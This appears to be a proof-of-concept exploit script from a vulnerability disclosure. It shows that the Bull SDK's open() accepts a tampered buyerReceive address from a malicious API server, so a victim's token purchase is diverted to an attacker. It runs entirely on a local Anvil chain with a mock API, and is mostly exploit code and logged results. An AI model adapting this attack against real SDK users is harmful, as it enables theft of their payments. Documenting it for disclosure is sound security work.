// PoC: Bull SDK open() does not verify buyerReceive (nor sellToken,
// sellAmount, payToken, payAmount, deadline) in the createDeal transaction
// the API server returns. It only checks buyer, seller and feeBps from the
// DealCreated event.
// Threat model (the SDK's own): "the API server is not trusted with your
// wallet. Every transaction it returns is checked before it is sent."
// A compromised/malicious API server can rewrite `buyerReceive` to an
// attacker address. The victim pays 0.5 ETH, the legitimate seller delivers
// real tokens, the swap settles — and the tokens go to the attacker. The
// victim loses the full payment and receives nothing.
//
// This script runs the REAL Bull SDK (bull-sdk.mjs, copied verbatim — see
// README.md for sha256) against a LOCAL Anvil chain, the REAL BullEscrow
// contract source (verified on Sourcify, chain 4663) and a mock Bull API.
// No real Bull infrastructure, no real funds, no mainnet.
//
//   1. Deploy BullEscrow (feeSigner controlled by the PoC) + RealToken.
//   2. Seller holds 1,000 RealToken. Victim holds ETH.
//   3. Victim calls bull.open({ seller, sellToken: RealToken, sellAmount:
//      "1000", payAsset: "eth", payAmount: "0.5" }) via the REAL SDK.
//      The mock API returns createDeal with buyerReceive = attacker.
//   4. SDK returns a dealId with NO ERROR (buyer/seller/feeBps all match).
//   5. Victim calls bull.fund(dealId) — pays 0.5 ETH into escrow.
//   6. Legit seller calls fundTokens() directly — the swap settles.
//   7. Result: attacker holds the 1,000 tokens; victim holds 0 tokens and
//      is 0.5 ETH poorer.
//
// Expected output: EXPLOITED.
import { readFileSync, writeFileSync } from "node:fs";
import {
  createPublicClient, createWalletClient, defineChain, http, parseAbi,
  formatUnits, formatEther, parseEther, parseUnits,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { Bull } from "./bull-sdk.mjs";
import { startMockApi } from "./mock-api.mjs";

const ANVIL_RPC = "http://127.0.0.1:8545";
const MOCK_API_PORT = 8788;
const ZERO = "0x0000000000000000000000000000000000000000";

const anvil = defineChain({
  id: 31337, name: "anvil",
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [ANVIL_RPC] } },
});

const tokenAbi = parseAbi([
  "function mint(address to, uint256 amount)",
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
]);
const escrowAbi = parseAbi([
  "function fundTokens(uint256 id)",
  "function nextId() view returns (uint256)",
  "function deals(uint256 id) view returns (address buyer, address seller, address sellToken, uint256 sellAmount, address payToken, uint256 payAmount, uint64 deadline, bool buyerFunded, bool sellerFunded, uint8 status, address sellerPayout, address buyerReceive, uint16 feeBps)",
]);

function loadArtifact(file, name) {
  const j = JSON.parse(readFileSync(`./chain/out/${file}/${name}.json`, "utf8"));
  return { abi: j.abi, bytecode: j.bytecode.object };
}

const log = (...a) => console.log(...a);

async function main() {
  const victim = privateKeyToAccount(generatePrivateKey());
  const seller = privateKeyToAccount(generatePrivateKey());
  const attacker = privateKeyToAccount(generatePrivateKey());
  const feeSignerKey = generatePrivateKey();
  const feeSigner = privateKeyToAccount(feeSignerKey);
  const pub = createPublicClient({ chain: anvil, transport: http() });
  const victimWallet = createWalletClient({ account: victim, chain: anvil, transport: http() });
  const sellerWallet = createWalletClient({ account: seller, chain: anvil, transport: http() });
  for (const a of [victim, seller, attacker]) {
    await pub.request({ method: "anvil_setBalance", params: [a.address, "0x21e19e0c9bab2400000"] });
  }

  // Deploy RealToken + the REAL BullEscrow (feeSigner controlled by this PoC).
  const tokenArt = loadArtifact("Mocks.sol", "MockERC20");
  const escrowArt = loadArtifact("BullEscrow.sol", "BullEscrow");
  const tokenHash = await victimWallet.deployContract({ abi: tokenArt.abi, bytecode: tokenArt.bytecode, args: [] });
  const token = (await pub.waitForTransactionReceipt({ hash: tokenHash })).contractAddress;
  const escrowHash = await victimWallet.deployContract({
    abi: escrowArt.abi, bytecode: escrowArt.bytecode,
    args: [attacker.address, feeSigner.address], // treasury, feeSigner
  });
  const deployedEscrow = (await pub.waitForTransactionReceipt({ hash: escrowHash })).contractAddress;
  // The SDK hardcodes the production escrow addresses in its safety guard, so
  // the local escrow must live at the production address for the REAL SDK to
  // accept its transactions. Etch the deployed bytecode (which already embeds
  // OUR treasury/feeSigner immutables) at the production address on Anvil.
  // The code is byte-identical to the verified BullEscrow source; only the
  // constructor-chosen immutables differ (treasury + feeSigner are ours).
  const PROD_ESCROW = "0xd685d39E7a3deF19E52B9AB09679b7452C23e20b";
  const deployedCode = await pub.getCode({ address: deployedEscrow });
  await pub.request({ method: "anvil_setCode", params: [PROD_ESCROW, deployedCode] });
  // Etching copies CODE only, not storage: the constructor-set storage
  // initializers (nextId = 1 in slot 0, _lock = 1 in slot 2) are zero at the
  // etched address and must be restored, or every guarded function reverts
  // with Reentrancy() and the first deal would get id 0.
  const one = "0x0000000000000000000000000000000000000000000000000000000000000001";
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000000", one] });
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_ESCROW, "0x0000000000000000000000000000000000000000000000000000000000000002", one] });
  const escrow = PROD_ESCROW;
  log("token (RealToken):", token);
  log("escrow (real BullEscrow, etched at prod address):", escrow);
  log("victim: ", victim.address);
  log("seller: ", seller.address);
  log("attacker:", attacker.address);

  // Seller holds 1,000 RealToken; approves the escrow for the deal.
  await victimWallet.writeContract({ address: token, abi: tokenAbi, functionName: "mint", args: [seller.address, parseUnits("1000", 18)] });
  await sellerWallet.writeContract({ address: token, abi: tokenAbi, functionName: "approve", args: [escrow, parseUnits("1000", 18)] });

  const getDealId = async () => {
    const next = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "nextId" });
    return next - 1n;
  };
  const server = await startMockApi({
    port: MOCK_API_PORT, escrow, feeSignerKey,
    attacker: attacker.address, victim: victim.address, getDealId,
  });
  log("mock Bull API listening on 127.0.0.1:" + MOCK_API_PORT);

  // Victim opens a deal through the REAL SDK: buy 1,000 RealToken for 0.5 ETH.
  const bull = new Bull({ walletClient: victimWallet, publicClient: pub, baseUrl: `http://127.0.0.1:${MOCK_API_PORT}` });
  const ethBefore = await pub.getBalance({ address: victim.address });
  log("victim ETH before:", formatEther(ethBefore));
  log("calling bull.open({ seller, sellToken: RealToken, sellAmount: '1000', payAmount: '0.5' })");
  let dealId;
  try {
    dealId = await bull.open({ seller: seller.address, sellToken: token, sellAmount: "1000", payAsset: "eth", payAmount: "0.5", deadlineHours: 24 });
    log("SDK returned dealId:", dealId, "— NO ERROR, NO WARNING about the tampered buyerReceive");
  } catch (e) {
    log("SDK threw (unexpected):", e.message);
    process.exit(2);
  }

  // Read the on-chain deal to show what was actually created.
  const deal = await pub.readContract({ address: escrow, abi: escrowAbi, functionName: "deals", args: [BigInt(dealId)] });
  log("on-chain deal buyerReceive:", deal[11], "(attacker is", attacker.address + ")");
  log("buyerReceive == attacker ?", deal[11].toLowerCase() === attacker.address.toLowerCase());

  // Victim funds 0.5 ETH via the REAL SDK.
  await bull.fund(dealId);
  log("victim funded 0.5 ETH via bull.fund()");

  // Legitimate seller delivers the real tokens (their own client, direct call).
  await sellerWallet.writeContract({ address: escrow, abi: escrowAbi, functionName: "fundTokens", args: [BigInt(dealId)] });
  log("seller delivered 1,000 RealToken — swap settled");

  const victimTokens = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  const attackerTokens = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [attacker.address] });
  const sellerEth = await pub.getBalance({ address: seller.address });
  const victimEth = await pub.getBalance({ address: victim.address });
  log("victim RealToken balance:", formatUnits(victimTokens, 18));
  log("attacker RealToken balance:", formatUnits(attackerTokens, 18));
  log("victim ETH after:", formatEther(victimEth), "(paid 0.5 ETH + gas)");
  log("seller ETH after:", formatEther(sellerEth), "(received 0.5 ETH minus 2.5% fee = 0.4875)");

  const result = {
    poc: "Bull SDK open() — buyerReceive not verified, tokens diverted to attacker",
    sdk: "bull-sdk.mjs (verbatim copy of https://www.bull.family/sdk/bull.mjs)",
    escrow: "BullEscrow.sol (verbatim source, verified on Sourcify chain 4663)",
    dealId: String(dealId),
    onChainBuyerReceive: deal[11],
    attackerAddress: attacker.address,
    buyerReceiveIsAttacker: deal[11].toLowerCase() === attacker.address.toLowerCase(),
    victimTokenBalance: formatUnits(victimTokens, 18),
    attackerTokenBalance: formatUnits(attackerTokens, 18),
    victimPaidEth: "0.5",
    exploited: victimTokens === 0n && attackerTokens === parseUnits("1000", 18),
  };
  writeFileSync("./poc-result.json", JSON.stringify(result, null, 2));
  log("\n=== RESULT ===");
  log(result.exploited ? "EXPLOITED: victim paid 0.5 ETH and received 0 tokens; attacker received all 1,000 tokens." : "NOT EXPLOITED — see poc-result.json");
  log("poc-result.json written.");
  server.close();
  process.exit(result.exploited ? 0 : 1);
}

main().catch((e) => { console.error("PoC crashed:", e); process.exit(3); });
